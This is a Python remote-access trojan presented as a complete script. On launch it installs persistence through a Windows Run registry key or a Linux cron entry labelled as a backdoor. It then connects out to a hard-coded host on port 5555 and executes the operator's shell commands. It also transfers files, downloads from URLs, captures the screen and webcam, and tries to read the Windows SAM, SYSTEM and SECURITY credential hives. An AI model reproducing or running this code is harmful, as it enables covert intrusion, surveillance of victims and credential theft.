#!/usr/bin/env python3

import os
import json
import socket
import subprocess
import requests
import cv2
import time
import sys
from sys import platform
from mss import mss


def runCommand(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        return output.decode(errors='ignore')
    except Exception as error:
        return str(error)


def sendData(data):
    json_payload = json.dumps(data)
    connection.send(json_payload.encode())


def receiveData():
    buffer = ''
    while True:
        try:
            buffer += connection.recv(1024).decode().rstrip()
            return json.loads(buffer)
        except ValueError:
            continue

def Persist():
    if getattr(sys, 'frozen', False):
        script_path = sys.executable
    else:
        script_path = os.path.abspath(__file__)

    if platform == "win32":
        try:
            persist_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemProcess /t REG_SZ /d "{script_path}" /f'
            subprocess.call(persist_command, shell=True)
        except Exception as error:
            print(f"[!] Error setting persistence on Windows: {error}")

    elif platform in ["linux", "linux2"]:
        try:
            cron_job = f"@reboot python3 {script_path}\n"
            with open("/etc/cron.d/my_persistent_backdoor", "w") as cron_file:
                cron_file.write(cron_job)
        except PermissionError:
            print("[!] Permission denied. Try running as root to set persistence.")
        except Exception as error:
            print(f"[!] Error setting persistence on Linux: {error}")

def receiveFile(file_name):
    with open(file_name, 'wb') as file:
        connection.settimeout(2)
        chunk = connection.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = connection.recv(1024)
            except socket.timeout:
                break
        connection.settimeout(None)


def sendFile(file_name):
    with open(file_name, 'rb') as file:
        connection.send(file.read())


def getUrlContent(url):
    response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as file:
        file.write(response.content)


def takeScreenshot():
    if platform in ["win32", "darwin"]:
        with mss() as screen:
            file_name = screen.shot()
            os.rename(file_name, 'screenshot.png')
    elif platform in ["linux", "linux2"]:
        with mss(display=":0.0") as screen:
            file_name = screen.shot()
            os.rename(file_name, 'screenshot.png')


def testAdminRole():
    global admin_status
    try:
        if platform == 'win32':
            try:
                test_path = os.path.join(os.environ.get('SystemRoot', 'C:\\windows'), 'temp')
                os.listdir(test_path)
                admin_status = '[+] Administrator Privileges Detected on Windows!'
            except PermissionError:
                admin_status = '[!] User Privileges Detected on Windows!'
                
        elif platform in ['linux']:
            if os.geteuid() == 0:
                admin_status = '[+] Root Privileges Detected!'
            else:
                admin_status = '[!] User Privileges Detected (Root Access Required for Some Commands)'
                
        else:
            admin_status = '[!] Unsupported Platform Detected'

    except Exception as error:
        admin_status = f'[!] Error Checking Privileges: {error}'
    
    return admin_status


def getInfo():
    if not testAdminRole():
        return "Administrator rights are required to perform this operation."
    
    paths = {
        "SAM": r'C:\Windows\System32\config\SAM',
        "SYSTEM": r'C:\Windows\System32\config\SYSTEM',
        "SECURITY": r'C:\Windows\System32\config\SECURITY'
    }
    
    try:
        sam_file = open(paths["SAM"], 'rb')
        system_file = open(paths["SYSTEM"], 'rb')
        security_file = open(paths["SECURITY"], 'rb')
        
        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()
        
        sam_file.close()
        system_file.close()
        security_file.close()
        
        return sam_data, system_data, security_data
    except PermissionError:
        return "[!] Access denied to SAM, SYSTEM, or SECURITY files."
    except FileNotFoundError:
        return "[! Unable to locate SAM, SYSTEM, or SECURITY file."
    except Exception as error:
        return f"[!] An error occurred: {str(error)}"

def webcamCapture():
    cam = cv2.VideoCapture(0)
    cam.set(cv2.CAP_PROP_EXPOSURE, 40)

    if not cam.isOpened():
        print("[!] Webcam not detected.")
        return
    
    success, frame = cam.read()

    if not success:
        print("[!] Could not capture image from webcam.")
        return

    cam.release()

    if platform in ["win32", "darwin", "linux", "linux2"]:
        success, buffer = cv2.imencode(".webcam.png", frame)
        if success:
            with open('webcam_capture.png', 'wb') as image_file:
                image_file.write(buffer.tobytes())
        else:
            print("[!] Failed to save webcam image.")


def shell():
    while True:
        cmd = receiveData()
        if cmd == 'quit':
            break
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            sendData("[+] Screen cleared.")
            continue
        elif cmd == 'help':
            continue
        elif cmd.startswith('upload '):
            receiveFile(cmd[7:])
            sendData('[+] File uploaded successfully.')
            continue
        elif cmd.startswith('download '):
            sendFile(cmd[9:])
            sendData('[+] File downloaded successfully.')
            continue
        elif cmd.startswith('get '):
            try:
                getUrlContent(cmd[4:])
                sendData('[+] File downloaded from the specified URL!')
            except:
                sendData('[!] Download failed!')
            continue
        elif cmd[:5] == 'start':
            try:
                subprocess.Popen(cmd[6:], shell=True)
                sendData('[+] Started')
            except:
                sendData('[!] Failed to start')
        elif cmd.startswith('screenshot'):
            takeScreenshot()
            sendFile('screenshot.png')
            os.remove('screenshot.png')
            sendData('[+] Screenshot taken and uploaded.')
            continue
        elif cmd.startswith('webcam'):
            webcamCapture()
            sendFile('webcam_capture.png')
            os.remove('webcam_capture.png')
            sendData('[+] Webcam image captured and uploaded.')
            continue
        elif cmd.startswith('get_sam_dump'):
            sam_data, system_data, security_data = getInfo()
            sendData('SAM dump acquired.')
            continue
        else:
            output = runCommand(cmd)
            if output:
                sendData(output)
            else:
                sendData("No output from the command.")


def connect():
    while True:
        time.sleep(1)
        try:
            connection.connect(('192.168.1.18', 5555))
            shell()
            connection.close()
            break
        except:
            connect()

Persist()
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()
